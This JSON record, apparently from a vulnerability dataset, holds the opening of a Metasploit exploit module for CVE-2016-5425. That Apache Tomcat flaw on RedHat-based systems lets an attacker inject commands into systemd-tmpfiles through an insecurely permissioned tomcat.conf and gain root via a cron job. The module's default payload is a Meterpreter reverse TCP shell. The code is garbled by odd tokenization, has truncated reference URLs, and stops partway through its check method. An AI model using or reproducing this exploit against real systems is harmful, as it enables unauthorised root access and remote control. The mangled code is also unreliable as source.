{
    "text": "vul_name : Apache Tomcat Privilege Escalation ， vul_cve : CVE-2016-5425 ， vul_poc :  ，  # This exploit sample shows how an exploit module could be written to exploit ，  # a bug in a command on a linux computer for priv esc. ， class MetasploitModule < Msf : Exploit : Local ， Rank = ManualRanking ， include Msf : Exploit : Retry ， include Msf : Post : Linux : Priv ， include Msf : Post : Linux : System ， include Msf : Post : File ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， include Msf : Post : Linux : Compile ， prepend Msf : Exploit : Remote : AutoCheck ， super (  ， update_info (  ， info ,  ， 'Name' => 'Apache Tomcat on RedHat Based Systems Insecure Temp Config Privilege Escalation' ,  ， 'Description' => %q{ ， This module exploits a vulnerability in RedHat based systems where ， improper file permissions are applied to /usr/lib/tmpfiles.d/tomcat.conf ， The configuration files in tmpfiles.d are used by systemd-tmpfiles to manage ， temporary files including their creation. ， With this weak permission , we're able to inject commands into systemd-tmpfiles ， service to write a cron job to execute our payload. ， systemd-tmpfiles is executed by default on boot on RedHat-based systems ， through systemd-tmpfiles-setup.service. Depending on the system in use ,  ， the execution of systemd-tmpfiles could also be triggered by other ， services , cronjobs , startup scripts etc. ， This module was tested against Tomcat 7.0.54-3 on Fedora 21. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'h00die' ,  # msf module ， 'Dawid Golunski <dawid @ legalhackers.com>' # original PoC , analysis , discovery ，  ]  ,  ， 'Platform' => [ 'linux' ]  ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'SessionTypes' => [ 'shell' , 'meterpreter' ]  ,  ， 'Targets' => [ 'Auto' , {} ]  ,  ， 'Privileged' => true ,  ， 'DefaultOptions' => { ， 'WfsDelay' => 1800 ,  # 30min ， 'payload' => 'linux/x64/meterpreter_reverse_tcp' ， } ,  ， ' ，  [ 'EDB' , '40488' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' # general tompfiles.d info ，  [ 'CVE' , '2016-5425' ]  ，  ]  ,  ， 'DisclosureDate' => '2016-10-10' ,  ， 'DefaultTarget' => 0 ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ,  ， 'SideEffects' => [ ARTIFACTS_ON_DISK , CONFIG_CHANGES , IOC_IN_LOGS ]  ， } ， register_advanced_options [  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write and execute files' , '/tmp' ]  )  ,  ，  ]  ， end ，  # Simplify pulling the writable directory variable ， def base_dir ， datastore [ 'WritableDir' ] .to_s ， end ， def tomcat_conf ， '/usr/lib/tmpfiles.d/tomcat.conf' ， end ， def suid? ( file )  ， get_suid_files ( file ) .include? file ， end ， def check ， package = cmd_exec ( 'rpm -qa | grep \"^tomcat\\- [ 678 ] \"' ) ",
    "time": "2023.03.14"
}